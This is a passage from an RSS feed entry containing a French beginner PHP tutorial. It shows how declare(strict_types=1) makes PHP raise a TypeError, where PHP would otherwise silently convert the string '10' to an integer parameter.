&lt;p&gt;Dans cette exemple le paramètre $a est de type integer. Malgré tout PHP ne retourne pas d’erreur. La raison c’est que PHP va tenter de convertir la string ‘10’ en integer. Si la conversion est possible alors aucune erreur n’est rapporté.&lt;/p&gt;

&lt;p&gt;Il arrive parfois que vous aimeriez que PHP ne permette pas cette conversion et exécute seulement si le paramètre est vraiment du type spécifié. Pour ce faire il faut ajouter un instruction au début de votre fichier.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;declare&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strict_types&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// TypeError&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici une erreur est retournée car le type du paramètre n’est pas un integer&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;C'est tout pour aujourd'hui, je publierai un nouvel article tous les deux jours environ. Pour être sûr de ne rien rater vous pouvez me suivre sur twitter : &lt;a href="https://twitter.com/EricLeCodeur"&gt;Suivre @EricLeCodeur&lt;/a&gt;&lt;/p&gt;

</description>
      <category>php</category>
      <category>french</category>
      <category>tutoriel</category>
      <category>beginners</category>
    </item>
  </channel>
</rss>
